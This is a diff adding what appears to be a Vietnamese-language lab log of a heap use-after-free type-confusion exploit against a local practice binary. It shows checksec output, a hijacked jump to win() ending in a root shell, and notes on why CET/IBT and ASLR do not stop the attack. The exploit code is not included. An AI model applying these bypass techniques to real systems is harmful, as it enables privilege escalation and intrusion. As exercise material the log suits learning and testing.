@@ -1,0 +1,27 @@
+Moi truong: Ubuntu 24.04.4 LTS, glibc 2.39-0ubuntu8.9, gcc 13.3.0. ASLR BAT.
+
+$ ./build.sh
+[*] built: uaf
+
+$ python3 exploit.py
+[*] '.../uaf'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Starting local process './uaf': pid ...
+[*] Process './uaf' stopped with exit code 0
+[win] control-flow hijacked -> /bin/sh
+===PWNED_9_2===
+uid=0(root) gid=0(root) groups=0(root)
+===END===
+
+[+] UAF type-confusion OK: win() reached, got shell
+
+Ghi chu:
+  - SHSTK/IBT (CET) bat mac dinh voi gcc 13, nhung ta nhay vao DAU ham win() (co
+    endbr64) nen IBT khong chan. CET khong lien quan toi khai thac heap o day.
+  - Binary no-PIE: dia chi win() co dinh, khong can leak, exploit chay ca khi ASLR bat.
